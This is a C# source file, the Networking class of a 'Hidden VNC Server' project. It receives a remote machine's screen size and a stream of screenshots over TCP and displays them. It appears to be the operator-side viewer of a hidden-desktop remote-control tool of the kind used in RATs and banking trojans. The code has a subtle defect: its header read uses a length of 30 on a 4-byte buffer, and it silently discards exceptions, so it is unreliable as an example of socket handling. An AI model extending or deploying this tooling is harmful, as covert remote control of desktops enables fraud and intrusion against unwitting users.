/*
 * This file is part of Hidden VNC implementation from github.com/ntdll0.
 *
 * Copyright (C) 2024 Andrej.sh, github.com/ntdll0
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Hidden_VNC_Server
{
    class Networking
    {
        public static class ScreenDimensions
        {
            public static double width;
            public static double height;
        }

        private TcpClient client;
        private PictureBox imageView;
        public Networking(TcpClient client, PictureBox imageView)
        {
            this.client = client;
            this.imageView = imageView;
        }

        public TcpClient Client
        {
            get
            {
                return client;
            }
        }

        private int[] ReceiveDimensions(Socket socket)
        {
            // We receive screen dimensions, later will be used for computing relative click coordinates
            int[] result = new int[2];
            int receivedDataSize = 0;
            for (int i = 0; i < 2; i++)
            {
                byte[] dimension = new byte[4];
                int bytesCount = socket.Receive(dimension);
                while (bytesCount < 4)
                {
                    receivedDataSize = socket.Receive(dimension, bytesCount, 4 - bytesCount, SocketFlags.None);
                    if (receivedDataSize <= 0)
                        return result;
                    bytesCount += receivedDataSize;
                }
                result[i] = BitConverter.ToInt32(dimension, 0);
            }

            return result;
        }

        public void Initialize()
        {
            try
            {
                Socket socket;
                int receivedDataSize = 0;
                socket = client.Client;

                int[] dimensions = ReceiveDimensions(socket);
                ScreenDimensions.width = dimensions[0];
                ScreenDimensions.height = dimensions[1];

                while (client.Connected)
                {
                    // First receive header, in order to know image size we are receiving
                    byte[] header = new byte[4];
                    int bytesCount = socket.Receive(header);
                    while (bytesCount < 4)
                    {
                        receivedDataSize = socket.Receive(header, bytesCount, 30 - bytesCount, SocketFlags.None);
                        if (receivedDataSize <= 0)
                            return;
                        bytesCount += receivedDataSize;
                    }

                    // We know image size now, so we just receive the image
                    int imageSize = BitConverter.ToInt32(header, 0);
                    byte[] fullImage = new byte[imageSize];
                    bytesCount = socket.Receive(fullImage);
                    while (bytesCount < imageSize)
                    {
                        receivedDataSize = socket.Receive(fullImage, bytesCount, imageSize - bytesCount, SocketFlags.None);
                        if (receivedDataSize <= 0)
                            return;
                        bytesCount += receivedDataSize;
                    }

                    // We invoke the change to imageView picturebox
                    imageView.Invoke(new Action(() =>
                    {
                        try
                        {
                            if (imageView.Image != null)
                                imageView.Image.Dispose();

                            imageView.Image = Image.FromStream(new MemoryStream(fullImage));
                        }
                        catch (Exception)
                        {
                            // Invalid image
                            MessageBox.Show("Invalid image received.");
                        }
                    }));
                }
            } catch(Exception ex)
            {
                //MessageBox.Show(ex);
            }

            client.Close();
        }
    }
}
